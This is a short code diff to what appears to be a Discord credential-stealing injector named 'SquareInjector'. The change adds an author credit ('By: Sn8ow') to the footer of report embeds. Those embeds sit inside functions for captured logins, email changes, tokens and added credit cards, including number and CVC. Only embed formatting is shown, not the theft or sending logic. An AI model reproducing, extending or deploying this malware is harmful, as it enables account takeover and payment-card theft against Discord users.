@@ -188,7 +188,7 @@ function Login(email, password, token) {
                                     "name": "SquareInjector"
                                 },
                                 "footer": {
-                                    "text": "SquareInjector"
+                                    "text": "SquareInjector By: Sn8ow"
                                 },
                                 "thumbnail": {
                                     "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
@@ -264,7 +264,7 @@ https.get(ipoptions, (ress) => {
                                 "name": "SquareInjector"
                             },
                             "footer": {
-                                "text": "SquareInjector"
+                                "text": "SquareInjector By: Sn8ow"
                             },
                             "thumbnail": {
                                 "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
@@ -341,7 +341,7 @@ function ChangeEmail(newemail, password, token) {
                                     "name": "SquareInjector"
                                 },
                                 "footer": {
-                                    "text": "SquareInjector"
+                                    "text": "SquareInjector By: Sn8ow"
                                 },
                                 "thumbnail": {
                                     "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
@@ -415,7 +415,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                                     "name": "SquareInjector"
                                 },
                                 "footer": {
-                                    "text": "SquareInjector"
+                                    "text": "SquareInjector By: Sn8ow"
                                 },
                                 "thumbnail": {
                                     "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
